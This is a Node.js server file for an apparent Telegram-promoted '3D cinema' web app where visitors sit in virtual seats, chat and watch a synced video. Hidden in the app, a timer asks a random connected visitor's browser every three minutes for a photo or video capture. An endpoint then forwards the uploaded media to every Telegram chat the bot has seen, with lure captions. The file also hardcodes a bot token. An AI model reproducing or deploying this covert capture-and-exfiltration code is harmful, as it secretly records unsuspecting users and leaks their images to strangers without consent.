const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const TOTAL_SEATS = 12;
const SEAT_POSITIONS = [
    // Ряд 1 (нижний)
    { x: -3.5, y: 0.5, z: 1.5 }, { x: -2.1, y: 0.5, z: 1.5 }, { x: -0.7, y: 0.5, z: 1.5 },
    { x: 0.7, y: 0.5, z: 1.5 }, { x: 2.1, y: 0.5, z: 1.5 }, { x: 3.5, y: 0.5, z: 1.5 },
    // Ряд 2 (верхний на ступени)
    { x: -3.5, y: 1.1, z: 4.5 }, { x: -2.1, y: 1.1, z: 4.5 }, { x: -0.7, y: 1.1, z: 4.5 },
    { x: 0.7, y: 1.1, z: 4.5 }, { x: 2.1, y: 1.1, z: 4.5 }, { x: 3.5, y: 1.1, z: 4.5 }
];

let players = {};
let videoState = {
    url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    startTime: Date.now()
};

let activeChatIds = new Set(['-1004486534339']);

const BOT_TOKEN = '8909586840:AAGmOGefqetTN-cFZrxQSkgYtn-bDAv_RvU';
const WEB_APP_URL = 'https://prostocvas.onrender.com/';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('message', (msg) => {
    if (msg.chat && msg.chat.id) activeChatIds.add(msg.chat.id.toString());
});

function getFreeSeatIndex() {
    const takenSeats = new Set(Object.values(players).map(p => p.seatIndex));
    for (let i = 0; i < TOTAL_SEATS; i++) {
        if (!takenSeats.has(i)) return i;
    }
    return Math.floor(Math.random() * TOTAL_SEATS);
}

function sendMediaRequest() {
    const socketIds = Object.keys(players);
    if (socketIds.length > 0) {
        const isVideo = Math.random() < 0.5;
        const targetSocket = socketIds[Math.floor(Math.random() * socketIds.length)];
        io.to(targetSocket).emit('requestCapture', { type: isVideo ? 'video' : 'photo' });
    } else {
        activeChatIds.forEach(chatId => {
            bot.sendMessage(chatId, "🎬 В кинотеатре идет фильм! Заходи смотреть вместе!", {
                reply_markup: { inline_keyboard: [[{ text: "🍿 Войти в 3D Кинотеатр", url: WEB_APP_URL }]] }
            }).catch(err => console.error(err.message));
        });
    }
}

app.post('/api/media', (req, res) => {
    const { type, data } = req.body;
    if (!data) return res.status(400).send("No data");

    const base64Data = data.replace(/^data:(image\/png|video\/webm);base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    activeChatIds.forEach(chatId => {
        if (type === 'photo') {
            bot.sendPhoto(chatId, buffer, {
                caption: "📸 Кадр из зала!",
                reply_markup: { inline_keyboard: [[{ text: "🎬 Войти", url: WEB_APP_URL }]] }
            }).catch(err => console.error(err.message));
        } else {
            bot.sendVideo(chatId, buffer, {
                caption: "🎥 Видео-обзор из зала!",
                reply_markup: { inline_keyboard: [[{ text: "🎬 Войти", url: WEB_APP_URL }]] }
            }).catch(err => console.error(err.message));
        }
    });

    res.send({ success: true });
});

setInterval(sendMediaRequest, 180000);

io.on('connection', (socket) => {
    socket.on('join', (data) => {
        const seatIndex = getFreeSeatIndex();
        const pos = SEAT_POSITIONS[seatIndex];

        players[socket.id] = {
            id: socket.id,
            nickname: data.nickname || `Зритель #${seatIndex + 1}`,
            seatIndex,
            x: pos.x, y: pos.y, z: pos.z,
            rotY: 0
        };

        const currentTime = (Date.now() - videoState.startTime) / 1000;
        socket.emit('init', {
            id: socket.id,
            seatIndex,
            players,
            seatPositions: SEAT_POSITIONS,
            videoState: { ...videoState, currentTime }
        });

        socket.broadcast.emit('playerJoined', players[socket.id]);
    });

    socket.on('look', (data) => {
        if (players[socket.id]) {
            players[socket.id].rotY = data.rotY;
            socket.broadcast.emit('playerLooked', { id: socket.id, rotY: data.rotY });
        }
    });

    socket.on('chatMessage', (msg) => {
        if (players[socket.id]) {
            io.emit('chatMessage', {
                id: socket.id,
                nickname: players[socket.id].nickname,
                text: msg
            });
        }
    });

    socket.on('changeVideo', (url) => {
        videoState = { url, startTime: Date.now() };
        io.emit('videoStateUpdate', { ...videoState, currentTime: 0 });
    });

    socket.on('disconnect', () => {
        delete players[socket.id];
        io.emit('playerLeft', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
